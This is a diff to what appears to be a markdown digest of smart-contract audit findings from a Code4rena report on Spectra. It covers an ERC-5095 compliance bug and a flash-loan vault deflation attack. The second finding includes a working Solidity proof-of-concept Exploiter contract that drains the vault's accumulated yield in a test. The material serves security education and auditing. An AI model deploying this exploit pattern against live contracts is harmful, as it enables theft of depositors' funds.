@@ -222,3 +222,118 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 4.[Medium] PrincipalToken is not ERC-5095 compliant
+
+### ERC-5095 withdraw & redeem
+
+- Summary: PrincipalToken doesn't meet ERC-5095 standards, causing potential integration issues. The contract's redeem, withdraw, maxWithdraw, and maxRedeem functions fail to meet the requirements specified by ERC-5095. These include supporting redemption and withdrawal flows where the sender has approval over the owner's tokens, not reverting in certain cases, and returning 0 when withdrawals or redemptions are disabled.
+
+- Impact & Recommendation: PrincipalToken's redeem and withdraw functions need adjustment to allow msg.sender to have EIP-20 approval over the owner's tokens. Similarly, maxRedeem and maxWithdraw functions should return 0 when PrincipalToken is paused.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-spectra#m-01-principaltoken-is-not-erc-5095-compliant) & [Report](https://code4rena.com/reports/2024-02-spectra)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+      //copy-paste into `PrincipalToken.sol`
+    function testRedeemDoesNotSupportERC20ApprovalFlow() public {
+        uint256 amountToDeposit = 1e18;
+        uint256 expected = _testDeposit(amountToDeposit, address(this));
+        _increaseTimeToExpiry();
+        principalToken.storeRatesAtExpiry();
+        principalToken.approve(MOCK_ADDR_5, UINT256_MAX);
+        assertEq(principalToken.allowance(address(this), MOCK_ADDR_5), UINT256_MAX);
+        vm.startPrank(MOCK_ADDR_5);
+        vm.expectRevert();
+        //Should not revert as MOCK_ADDR_5 has allowance over tokens.
+        principalToken.redeem(expected, MOCK_ADDR_5, address(this));
+        vm.stopPrank();
+    }
+
+    function testWithdrawDoesNotSupportERC20ApprovalFlow() public {
+        uint256 amount = 1e18;
+        underlying.approve(address(principalToken), amount);
+        principalToken.deposit(amount, testUser);
+        principalToken.approve(MOCK_ADDR_5, UINT256_MAX);
+        assertEq(principalToken.allowance(address(this), MOCK_ADDR_5), UINT256_MAX);
+        vm.prank(MOCK_ADDR_5);
+        vm.expectRevert();
+        //Should not revert as MOCK_ADDR_5 has allowance over tokens.
+        principalToken.withdraw(amount, MOCK_ADDR_5, testUser);
+        vm.stopPrank();
+    }
+
+  ```
+
+  </details>
+
+## 5.[Medium] All yield generated in the IBT vault can be drained by performing a vault deflation attack using the flash loan functionality of the Principal Token contract
+
+### ERC4626 deflation attack
+
+- Summary: A vulnerability in the IBT vault enables a flash loan attack using the PrincipalToken contract's lending feature. By borrowing the entire IBT balance, an attacker can exploit the vault's share price formula, resetting it to the default value 1 and causing significant losses to users, who may lose all accumulated yield and more, depending on the IBT price.
+
+- Impact & Recommendation: In the PrincipalToken::flashLoan function, verify that the IBT rate/price has not decreased once the flash loan has been repaid.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-spectra#m-02-all-yield-generated-in-the-ibt-vault-can-be-drained-by-performing-a-vault-deflation-attack-using-the-flash-loan-functionality-of-the-principal-token-contract) & [Report](https://code4rena.com/reports/2024-02-spectra)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+    // SPDX-License-Identifier: UNLICENSED
+    pragma solidity 0.8.20;
+    import {ContractPrincipalToken} from "./PrincipalToken4.t.sol";
+    import "openzeppelin-contracts/interfaces/IERC4626.sol";
+    import "openzeppelin-contracts/interfaces/IERC3156FlashBorrower.sol";
+    contract PrincipalTokenIBTDelfation is ContractPrincipalToken {
+        function testDeflateIBTVault() public {
+            // TEST_USER_1 deposits 1 IBT into the principal token contract
+            vm.startPrank(TEST_USER_1);
+            underlying.mint(TEST_USER_1, 1e18 - 1); // -1 because TEST_USER_1 already has 1 wei of IBT
+            underlying.approve(address(ibt), 1e18 - 1);
+            ibt.deposit(1e18 - 1, TEST_USER_1);
+            ibt.approve(address(principalToken), 1e18);
+            principalToken.depositIBT(1e18, TEST_USER_1);
+            vm.stopPrank();
+            // TEST_USER_2 deposits 9 IBT into the principal token contract
+            vm.startPrank(TEST_USER_2);
+            underlying.mint(TEST_USER_2, 9e18);
+            underlying.approve(address(ibt), 9e18);
+            ibt.deposit(9e18, TEST_USER_2);
+            ibt.approve(address(principalToken), 9e18);
+            principalToken.depositIBT(9e18, TEST_USER_2);
+            vm.stopPrank();
+            // Simulate vault interest accrual by manualy inflating the share price
+            vm.startPrank(TEST_USER_3);
+            uint256 generatedYield = 10e18;
+            underlying.mint(TEST_USER_3, generatedYield);
+            underlying.transfer(address(ibt), generatedYield);
+            vm.stopPrank();
+            // Execute exploit using the Exploiter contract
+            Exploiter exploiterContract = new Exploiter();
+            uint256 underlyingBalanceBeforeExploit = underlying.balanceOf(address(exploiterContract));
+            principalToken.flashLoan(exploiterContract, address(ibt), 10e18, "");
+            uint256 underlyingBalanceAfterExploit = underlying.balanceOf(address(exploiterContract));
+            assertEq(underlyingBalanceBeforeExploit, 0);
+            assertEq(underlyingBalanceAfterExploit, generatedYield); // All of the generated yield got stollen by the attacker
+        }
+    }
+    contract Exploiter is IERC3156FlashBorrower {
+        function onFlashLoan(
+            address initiator,
+            address token,
+            uint256 amount,
+            uint256 fee,
+            bytes calldata data
+        ) external returns (bytes32) {
+            IERC4626 ibt = IERC4626(token);
+            ibt.redeem(amount, address(this), address(this));
+            IERC20(ibt.asset()).approve(address(ibt), type(uint256).max);
+            ibt.mint(amount + fee, address(this));
+            ibt.approve(msg.sender, amount + fee);
+            return keccak256("ERC3156FlashBorrower.onFlashLoan");
+        }
+    }
+
+  ```
+
+  </details>
